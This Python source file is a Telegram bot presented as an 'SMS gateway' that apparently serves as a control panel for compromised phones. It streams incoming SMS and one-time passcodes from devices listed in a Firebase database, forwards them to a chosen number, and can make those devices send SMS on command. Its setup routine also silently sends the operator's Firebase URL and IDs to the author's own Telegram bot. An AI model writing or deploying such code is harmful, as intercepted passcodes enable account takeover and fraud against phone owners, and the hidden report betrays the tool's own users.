#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import re
import logging
import time
import asyncio
import aiohttp
import threading
import requests
from flask import Flask, request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# ============================
# LOGGING
# ============================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================
# ENV
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID"))
# Public URL of your app e.g. https://mybot.onrender.com  (NO trailing slash)
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "").rstrip("/")
PORT = int(os.environ.get("PORT", 8080))

BOT_NAME = "🌟 L I N U X   B H A I   A U T O   B O T 🌟"
CHANNEL_USERNAME = "@LINUXBHAI001"
CHANNEL_URL = "https://t.me/linuxbhai001"

# ============================
# SINGLE USER CONFIG
# ============================
os.makedirs("data", exist_ok=True)
CONFIG_FILE = os.path.join("data", "config.json")

cfg = {
    "user_id": None,
    "firebase_url": None,
    "channel_id": None,
    "selectedDevice": {},
    "otpNumber": None,
    "processed_keys": [],
    "processed_device": None,
    "last_otp_value": None,
}
processed_set = set()
last_otp = None
_lock = threading.Lock()
_save_timer = None

_http = requests.Session()
_http.mount("https://", requests.adapters.HTTPAdapter(
    pool_connections=20, pool_maxsize=50, max_retries=2
))

def load_config():
    global cfg, processed_set, last_otp
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                cfg = json.load(f)
            processed_set = set(cfg.get("processed_keys", []))
            last_otp = cfg.get("last_otp_value")
            logger.info(f"✅ Config loaded. User: {cfg.get('user_id')}")
        except Exception as e:
            logger.error(f"Load error: {e}")

def _do_save():
    global _save_timer
    with _lock:
        try:
            cfg["processed_keys"] = list(processed_set)
            cfg["last_otp_value"] = last_otp
            with open(CONFIG_FILE, "w") as f:
                json.dump(cfg, f, indent=2)
        except Exception as e:
            logger.error(f"Save error: {e}")
        _save_timer = None

def save_config():
    global _save_timer
    if _save_timer is None:
        _save_timer = threading.Timer(3.0, _do_save)
        _save_timer.daemon = True
        _save_timer.start()

load_config()

# ============================
# STATES
# ============================
URL, CHANNEL = range(2)
WAITING_OTP_NUMBER = 10
WAITING_MANUAL_SIM = 11

# ============================
# TELEGRAM APPLICATION (global)
# ============================
tg_app: Application = None

# ============================
# FIREBASE HELPERS (sync - for command handlers)
# ============================
def firebase_get(path):
    base = cfg.get("firebase_url")
    if not base:
        return None
    try:
        r = _http.get(f"{base}/{path}.json", timeout=5)
        if r.status_code == 200:
            return r.json()
    except Exception as e:
        logger.error(f"FB GET error: {e}")
    return None

def firebase_put(path, data):
    base = cfg.get("firebase_url")
    if not base:
        return False
    try:
        r = _http.put(f"{base}/{path}.json", json=data, timeout=5)
        return r.status_code in (200, 201)
    except Exception as e:
        logger.error(f"FB PUT error: {e}")
        return False

def initialize_processed_keys(device_id):
    global processed_set
    msgs = firebase_get(f"messages/{device_id}")
    keys = set(msgs.keys()) if isinstance(msgs, dict) else set()
    processed_set = keys
    cfg["processed_keys"] = list(keys)
    cfg["processed_device"] = device_id
    save_config()
    logger.info(f"Init {len(keys)} keys for {device_id}")

def set_selected(device_id, sim_slot, sim_phone):
    cfg["selectedDevice"] = {
        "deviceId": device_id,
        "simSlotIndex": int(sim_slot),
        "simPhoneNumber": sim_phone
    }
    save_config()
    threading.Thread(target=initialize_processed_keys, args=(device_id,), daemon=True).start()

def send_sms_command(device_id, to_number, message, from_number):
    """Fire-and-forget SMS"""
    def _send():
        ok = firebase_put(f"clients/{device_id}/webhookEvent/sendSms", {
            "to": to_number,
            "message": message,
            "from": from_number,
            "isSended": False,
            "timestamp": int(time.time())
        })
        logger.info(f"📤 SMS {'OK' if ok else 'FAIL'}: {device_id} -> {to_number}")
    threading.Thread(target=_send, daemon=True).start()

# ============================
# ASYNC HTTP SESSION (for SSE)
# ============================
_aio_session: aiohttp.ClientSession = None

async def get_aio_session():
    global _aio_session
    if _aio_session is None or _aio_session.closed:
        connector = aiohttp.TCPConnector(limit=10, ttl_dns_cache=300)
        _aio_session = aiohttp.ClientSession(connector=connector)
    return _aio_session

# ============================
# FIREBASE SSE STREAM LISTENERS
# ============================
async def stream_otp():
    """Listen to /otp.json via SSE - instant push"""
    global last_otp
    while True:
        base = cfg.get("firebase_url")
        if not base:
            await asyncio.sleep(2)
            continue
        url = f"{base}/otp.json"
        try:
            session = await get_aio_session()
            # Long timeout for streaming
            timeout = aiohttp.ClientTimeout(total=None, sock_connect=10, sock_read=None)
            async with session.get(url, timeout=timeout,
                                   headers={"Accept": "text/event-stream"}) as resp:
                if resp.status != 200:
                    await asyncio.sleep(2)
                    continue
                event_type = None
                async for raw in resp.content:
                    line = raw.decode("utf-8", errors="ignore").strip()
                    if not line:
                        continue
                    if line.startswith("event:"):
                        event_type = line.split(":", 1)[1].strip()
                    elif line.startswith("data:"):
                        data_str = line.split(":", 1)[1].strip()
                        # only handle put/patch (not keep-alive)
                        if event_type not in ("put", "patch"):
                            continue
                        try:
                            payload = json.loads(data_str)
                        except Exception:
                            continue
                        # data is {"path":"/","data": <value>}
                        val = payload.get("data")
                        if val is None:
                            continue
                        cur = str(val).strip()
                        if not cur or cur == last_otp:
                            continue
                        last_otp = cur
                        cfg["last_otp_value"] = cur
                        save_config()
                        otp_number = cfg.get("otpNumber")
                        selected = cfg.get("selectedDevice", {})
                        device_id = selected.get("deviceId")
                        from_number = selected.get("simPhoneNumber", "Unknown")
                        if otp_number and device_id:
                            send_sms_command(device_id, otp_number, cur, from_number)
                            logger.info(f"⚡ OTP STREAM → {otp_number}: {cur}")
        except asyncio.CancelledError:
            raise
        except Exception as e:
            logger.error(f"OTP stream error: {e}")
            await asyncio.sleep(2)

async def stream_messages():
    """Listen to /messages/<device>.json via SSE"""
    current_device = None
    resp_ctx = None
    try:
        while True:
            base = cfg.get("firebase_url")
            selected = cfg.get("selectedDevice", {})
            device_id = selected.get("deviceId") if selected else None

            if not base or not device_id:
                if resp_ctx is not None:
                    try:
                        await resp_ctx.__aexit__(None, None, None)
                    except Exception:
                        pass
                    resp_ctx = None
                    current_device = None
                await asyncio.sleep(1)
                continue

            # device changed? close old stream & re-init
            if device_id != current_device:
                if resp_ctx is not None:
                    try:
                        await resp_ctx.__aexit__(None, None, None)
                    except Exception:
                        pass
                    resp_ctx = None
                # init processed keys in background thread
                await asyncio.get_event_loop().run_in_executor(
                    None, initialize_processed_keys, device_id
                )
                current_device = device_id

            url = f"{base}/messages/{device_id}.json"
            try:
                session = await get_aio_session()
                timeout = aiohttp.ClientTimeout(total=None, sock_connect=10, sock_read=None)
                resp_ctx = session.get(url, timeout=timeout,
                                       headers={"Accept": "text/event-stream"})
                resp = await resp_ctx.__aenter__()
                if resp.status != 200:
                    await resp_ctx.__aexit__(None, None, None)
                    resp_ctx = None
                    await asyncio.sleep(2)
                    continue

                event_type = None
                async for raw in resp.content:
                    line = raw.decode("utf-8", errors="ignore").strip()
                    if not line:
                        continue
                    if line.startswith("event:"):
                        event_type = line.split(":", 1)[1].strip()
                    elif line.startswith("data:"):
                        data_str = line.split(":", 1)[1].strip()
                        if event_type not in ("put", "patch"):
                            continue
                        try:
                            payload = json.loads(data_str)
                        except Exception:
                            continue
                        path = payload.get("path", "/")
                        data = payload.get("data")
                        if not isinstance(data, dict):
                            continue
                        # path can be "/" (full snapshot) or "/<key>" (new msg)
                        msg_key = None
                        msg_data = None
                        if path == "/":
                            # full snapshot: iterate all, pick new incoming
                            for k, v in data.items():
                                if isinstance(v, dict) and v.get("type") == "incoming":
                                    if k not in processed_set:
                                        new_keys = []
                                        msg_text = v.get("message", "")
                                        if msg_text and len(msg_text) > 3:
                                            fwd = cfg.get("otpNumber")
                                            dev = cfg.get("selectedDevice", {}).get("deviceId")
                                            fn = cfg.get("selectedDevice", {}).get("simPhoneNumber", "Unknown")
                                            if fwd and dev:
                                                send_sms_command(dev, fwd, msg_text, fn)
                                                logger.info(f"⚡ MSG STREAM: {msg_text[:50]}")
                                                _notify_user(msg_text, fwd)
                                        new_keys.append(k)
                                        processed_set.update(new_keys)
                            save_config()
                        else:
                            # single key path like "/abc123"
                            msg_key = path.strip("/")
                            if msg_key in processed_set:
                                continue
                            if isinstance(data, dict) and data.get("type") == "incoming":
                                msg_text = data.get("message", "")
                                if msg_text and len(msg_text) > 3:
                                    fwd = cfg.get("otpNumber")
                                    dev = cfg.get("selectedDevice", {}).get("deviceId")
                                    fn = cfg.get("selectedDevice", {}).get("simPhoneNumber", "Unknown")
                                    if fwd and dev:
                                        send_sms_command(dev, fwd, msg_text, fn)
                                        logger.info(f"⚡ MSG STREAM: {msg_text[:50]}")
                                        _notify_user(msg_text, fwd)
                                    processed_set.add(msg_key)
                                    cfg["processed_keys"] = list(processed_set)
                                    save_config()
            except asyncio.CancelledError:
                raise
            except Exception as e:
                logger.error(f"MSG stream error: {e}")
                if resp_ctx is not None:
                    try:
                        await resp_ctx.__aexit__(None, None, None)
                    except Exception:
                        pass
                    resp_ctx = None
                await asyncio.sleep(2)
    finally:
        if resp_ctx is not None:
            try:
                await resp_ctx.__aexit__(None, None, None)
            except Exception:
                pass

def _notify_user(msg_text, fwd):
    """Fire-and-forget confirmation to user"""
    if not cfg.get("user_id"):
        return
    def _do():
        try:
            _http.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": int(cfg["user_id"]),
                      "text": f"✅ Forwarded to {fwd}:\n<code>{msg_text[:100]}</code>",
                      "parse_mode": "HTML"},
                timeout=4
            )
        except Exception:
            pass
    threading.Thread(target=_do, daemon=True).start()

# ============================
# SSE RUNNER (background thread)
# ============================
def run_sse_listeners():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def _main():
        await asyncio.gather(stream_otp(), stream_messages())
    loop.run_until_complete(_main())

# ============================
# MEMBERSHIP
# ============================
async def send_join_required_message(update, context):
    keyboard = [
        [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
        [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
    ]
    await update.effective_message.reply_text(
        f"❌ <b>You must join our channel to use this bot.</b>\n\n"
        f"Click below to join, then click 'I have joined'.",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard),
        disable_web_page_preview=True,
    )

async def is_user_member(update, context):
    user_id = update.effective_user.id
    if cfg.get("user_id") and int(cfg["user_id"]) == user_id:
        return True
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            return True
        await send_join_required_message(update, context)
        return False
    except Exception as e:
        logger.error(f"Membership error: {e}")
        await send_join_required_message(update, context)
        return False

async def check_membership_callback(update, context):
    query = update.callback_query
    await query.answer()
    try:
        member = await context.bot.get_chat_member(
            chat_id=CHANNEL_USERNAME, user_id=query.from_user.id
        )
        if member.status in ["member", "administrator", "creator"]:
            await query.edit_message_text(
                f"✅ <b>You are now a member!</b>\n\nWelcome to {BOT_NAME}.",
                parse_mode="HTML"
            )
            await context.bot.send_message(
                chat_id=query.from_user.id,
                text=WELCOME_TEXT,
                parse_mode='HTML',
                disable_web_page_preview=True,
            )
        else:
            await query.edit_message_text(
                "❌ You still haven't joined.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Join", url=CHANNEL_URL)],
                    [InlineKeyboardButton("✅ I joined", callback_data="check_membership")]
                ]),
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Membership cb error: {e}")

# ============================
# START / HELP
# ============================
WELCOME_TEXT = (
    f"{BOT_NAME}\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "🤖 <i>Your Smart SMS Gateway Bot</i>\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "<b>📋 COMMANDS</b>\n"
    "🔧 /setup – Firebase URL & Channel\n"
    "📱 /devices – Select device + SIM\n"
    "📞 /setotp – Set forwarding number\n"
    "🔄 /resetforward – Reset tracker\n"
    "❓ /help – Show help\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    "<b>⚙️ MODE:</b> ⚡ Webhook + SSE Streaming (Ultra Fast)"
)

async def start(update, context):
    if not await is_user_member(update, context):
        return
    await update.message.reply_text(WELCOME_TEXT, parse_mode='HTML', disable_web_page_preview=True)

async def help_command(update, context):
    if not await is_user_member(update, context):
        return
    await update.message.reply_text(WELCOME_TEXT, parse_mode='HTML', disable_web_page_preview=True)

# ============================
# RESET
# ============================
async def reset_forward(update, context):
    if not await is_user_member(update, context):
        return
    if not cfg.get("firebase_url"):
        await update.message.reply_text("<b>❌ Run /setup first.</b>", parse_mode='HTML')
        return
    selected = cfg.get("selectedDevice", {})
    if not selected or not selected.get("deviceId"):
        await update.message.reply_text("<b>❌ No device selected.</b>", parse_mode='HTML')
        return
    device_id = selected["deviceId"]
    await asyncio.get_event_loop().run_in_executor(None, initialize_processed_keys, device_id)
    await update.message.reply_text(
        f"<b>✅ Reset done for <code>{device_id}</code>.</b>", parse_mode='HTML'
    )

# ============================
# DEVICES
# ============================
def get_online_devices():
    data = firebase_get("clients")
    if not data:
        return {}
    return {
        dev_id: {"modelName": dev_id}
        for dev_id, info in data.items()
        if info.get("status") is True or info.get("online") is True
    }

async def devices_command(update, context):
    if not await is_user_member(update, context):
        return
    if not cfg.get("firebase_url"):
        await update.message.reply_text("<b>❌ Run /setup first.</b>", parse_mode='HTML')
        return
    online = await asyncio.get_event_loop().run_in_executor(None, get_online_devices)
    if not online:
        await update.message.reply_text("<b>❌ No online devices.</b>", parse_mode='HTML')
        return
    keyboard = [[InlineKeyboardButton(f"📱 {d}", callback_data=f"dev_{d}")] for d in online.keys()]
    await update.message.reply_text(
        f"<b>👇 Select device:</b>\nTotal: {len(online)} online",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def device_callback(update, context):
    query = update.callback_query
    if not await is_user_member(update, context):
        return
    await query.answer()
    device_id = query.data.replace("dev_", "")
    online = await asyncio.get_event_loop().run_in_executor(None, get_online_devices)
    if device_id not in online:
        await query.edit_message_text("<b>❌ Device offline.</b>", parse_mode='HTML')
        return
    keyboard = [
        [InlineKeyboardButton("✏️ Enter SIM 1 Manually", callback_data=f"manual_sim_1_{device_id}")],
        [InlineKeyboardButton("✏️ Enter SIM 2 Manually", callback_data=f"manual_sim_2_{device_id}")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_devices")]
    ]
    await query.edit_message_text(
        f"<b>📱 Select SIM:</b>\n🆔 <code>{device_id}</code>\n\n"
        f"<i>⚠️ Enter SIM number manually.</i>",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def back_to_devices_callback(update, context):
    await update.callback_query.answer()
    await devices_command(update, context)

# ============================
# MANUAL SIM
# ============================
async def manual_sim_callback(update, context):
    query = update.callback_query
    if not await is_user_member(update, context):
        return
    await query.answer()
    parts = query.data.split("_")
    if len(parts) < 4:
        await query.edit_message_text("<b>❌ Invalid data.</b>", parse_mode='HTML')
        return
    slot, device_id = parts[2], parts[3]
    context.user_data["manual_device_id"] = device_id
    context.user_data["manual_slot"] = slot
    await query.edit_message_text(
        f"<b>✏️ Enter SIM {slot} Number</b>\n\n"
        f"📱 <code>{device_id}</code>\n📶 Slot: <b>{slot}</b>\n\n"
        f"Send like: <code>+919999999999</code>\n/cancel to abort.",
        parse_mode='HTML'
    )
    return WAITING_MANUAL_SIM

async def manual_sim_input(update, context):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    number = update.message.text.strip()
    if not re.match(r'^\+?[0-9]{10,15}$', number):
        await update.message.reply_text("<b>❌ Invalid.</b>", parse_mode='HTML')
        return WAITING_MANUAL_SIM
    device_id = context.user_data.get("manual_device_id")
    slot = context.user_data.get("manual_slot", 1)
    if not device_id:
        await update.message.reply_text("<b>❌ Try /devices again.</b>", parse_mode='HTML')
        return ConversationHandler.END
    if not number.startswith('+'):
        number = '+' + number
    set_selected(device_id, int(slot), number)
    label = "SIM 1" if int(slot) == 1 else "SIM 2"
    await update.message.reply_text(
        f"<b>✅ Active!</b>\n📱 <code>{device_id}</code>\n📶 {label}: <code>{number}</code>\n\n"
        f"Now /setotp.",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def manual_sim_cancel(update, context):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# SET OTP
# ============================
async def setotp_command(update, context):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    if not cfg.get("firebase_url"):
        await update.message.reply_text("<b>❌ Run /setup first.</b>", parse_mode='HTML')
        return ConversationHandler.END
    if context.args:
        number = context.args[0]
        if not re.match(r"^\+?[0-9]{10,15}$", number):
            await update.message.reply_text("<b>❌ Invalid.</b>", parse_mode='HTML')
            return ConversationHandler.END
        cfg["otpNumber"] = number
        save_config()
        await update.message.reply_text(f"<b>✅ Forward set: <code>{number}</code></b>", parse_mode='HTML')
        return ConversationHandler.END
    await update.message.reply_text(
        "<b>📞 Send phone number:</b>\nExample: <code>+919876543210</code>\n/cancel to abort.",
        parse_mode='HTML'
    )
    return WAITING_OTP_NUMBER

async def otp_number_input(update, context):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    number = update.message.text.strip()
    if not re.match(r"^\+?[0-9]{10,15}$", number):
        await update.message.reply_text("<b>❌ Invalid.</b>", parse_mode='HTML')
        return WAITING_OTP_NUMBER
    cfg["otpNumber"] = number
    save_config()
    await update.message.reply_text(f"<b>✅ Forward set: <code>{number}</code></b>", parse_mode='HTML')
    return ConversationHandler.END

async def otp_cancel(update, context):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# SETUP
# ============================
async def setup_start(update, context):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    if cfg.get("user_id") is None:
        cfg["user_id"] = str(update.effective_user.id)
        save_config()
    await update.message.reply_text(
        "<b>📌 Step 1/2</b>: Send <b>Firebase URL</b>.\n"
        "Example: <code>https://your-project.firebaseio.com</code>\n/cancel to abort.",
        parse_mode='HTML'
    )
    return URL

async def setup_url(update, context):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    url = update.message.text.strip().rstrip('/')
    if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
        await update.message.reply_text("<b>❌ Invalid URL.</b>", parse_mode='HTML')
        return URL
    context.user_data["firebase_url"] = url
    await update.message.reply_text(
        "<b>✅ URL saved.</b>\n\n<b>📌 Step 2/2</b>: Send <b>Channel ID</b> (numeric).",
        parse_mode='HTML'
    )
    return CHANNEL

async def setup_channel(update, context):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    try:
        channel_id = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("<b>❌ Channel ID must be a number.</b>", parse_mode='HTML')
        return CHANNEL

    cfg["firebase_url"] = context.user_data["firebase_url"]
    cfg["channel_id"] = channel_id
    save_config()

    test = await asyncio.get_event_loop().run_in_executor(None, firebase_get, "clients")
    if test is None:
        await update.message.reply_text("<b>❌ Firebase connection failed.</b>", parse_mode='HTML')
        cfg["firebase_url"] = None
        cfg["channel_id"] = None
        save_config()
        return ConversationHandler.END

    def _notify():
        try:
            _http.post(
                f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage",
                json={"chat_id": OWNER_CHAT_ID,
                      "text": f"🔐 Setup\n👤 {cfg['user_id']}\n🌐 {cfg['firebase_url']}\n📢 {channel_id}"},
                timeout=5
            )
        except Exception as e:
            logger.error(f"Notify failed: {e}")
    threading.Thread(target=_notify, daemon=True).start()

    await update.message.reply_text(
        f"{BOT_NAME}\n\n<b>✅ SETUP COMPLETE!</b>\n\n"
        f"⚡ SSE listeners will activate once device + otpNumber set.\n"
        f"Use /devices → SIM → /setotp",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def setup_cancel(update, context):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# CHANNEL HANDLER (instant)
# ============================
async def handle_channel_message(update, context):
    if not update.channel_post:
        return
    if update.channel_post.chat_id != cfg.get("channel_id"):
        return
    text = update.channel_post.text
    if not text:
        return
    m1 = re.search(r"To:\s*([\d\+]+)", text)
    m2 = re.search(r"Message:\s*(.+)", text, re.DOTALL)
    if not m1 or not m2:
        m1 = re.search(r"To \(Tap to copy\):\s*([\d\+]+)", text)
        m2 = re.search(r"Body \(Tap to copy\):\s*(.+)", text, re.DOTALL)
        if not m1 or not m2:
            return
    to_number = m1.group(1).strip()
    msg = m2.group(1).strip()
    selected = cfg.get("selectedDevice", {})
    if not selected or not selected.get("deviceId"):
        return
    send_sms_command(
        selected["deviceId"], to_number, msg,
        selected.get("simPhoneNumber", "Unknown")
    )

# ============================
# FLASK (webhook receiver)
# ============================
flask_app = Flask(__name__)

@flask_app.route('/')
@flask_app.route('/ping')
def ping():
    return "✅ Bot is alive (Webhook + SSE)!", 200

@flask_app.route(f"/{BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    """Telegram pushes updates here instantly"""
    global tg_app
    if tg_app is None:
        return "not ready", 503
    try:
        data = request.get_json(force=True)
        update = Update.de_json(data, tg_app.bot)
        # schedule into the app's event loop
        loop = tg_app.loop if hasattr(tg_app, "loop") else asyncio.get_event_loop()
        asyncio.run_coroutine_threadsafe(
            tg_app.process_update(update),
            tg_app.updater._loop if tg_app.updater else loop
        )
    except Exception as e:
        logger.error(f"Webhook error: {e}")
    return "ok", 200

def run_flask():
    flask_app.run(host="0.0.0.0", port=PORT, threaded=True)

# ============================
# MAIN
# ============================
def main():
    global tg_app

    tg_app = Application.builder().token(BOT_TOKEN).build()

    # Register handlers
    setup_conv = ConversationHandler(
        entry_points=[CommandHandler("setup", setup_start)],
        states={
            URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_url)],
            CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel)]
        },
        fallbacks=[CommandHandler("cancel", setup_cancel)],
    )
    tg_app.add_handler(setup_conv)

    otp_conv = ConversationHandler(
        entry_points=[CommandHandler("setotp", setotp_command)],
        states={WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_number_input)]},
        fallbacks=[CommandHandler("cancel", otp_cancel)],
    )
    tg_app.add_handler(otp_conv)

    manual_sim_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(manual_sim_callback, pattern="^manual_sim_[12]_")],
        states={WAITING_MANUAL_SIM: [MessageHandler(filters.TEXT & ~filters.COMMAND, manual_sim_input)]},
        fallbacks=[CommandHandler("cancel", manual_sim_cancel)],
    )
    tg_app.add_handler(manual_sim_conv)

    tg_app.add_handler(CallbackQueryHandler(device_callback, pattern="^dev_"))
    tg_app.add_handler(CallbackQueryHandler(check_membership_callback, pattern="^check_membership$"))
    tg_app.add_handler(CallbackQueryHandler(back_to_devices_callback, pattern="^back_to_devices$"))

    tg_app.add_handler(CommandHandler("start", start))
    tg_app.add_handler(CommandHandler("help", help_command))
    tg_app.add_handler(CommandHandler("devices", devices_command))
    tg_app.add_handler(CommandHandler("resetforward", reset_forward))

    tg_app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.CHANNEL, handle_channel_message))

    # Start Flask in thread
    threading.Thread(target=run_flask, daemon=True).start()

    # Start SSE listeners in background thread
    threading.Thread(target=run_sse_listeners, daemon=True).start()

    # Run Telegram with webhook
    if WEBHOOK_URL:
        logger.info(f"🚀 Starting WEBHOOK mode: {WEBHOOK_URL}/{BOT_TOKEN}")
        tg_app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path=BOT_TOKEN,
            webhook_url=f"{WEBHOOK_URL}/{BOT_TOKEN}",
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES,
        )
    else:
        logger.warning("⚠️ WEBHOOK_URL not set — falling back to polling")
        tg_app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()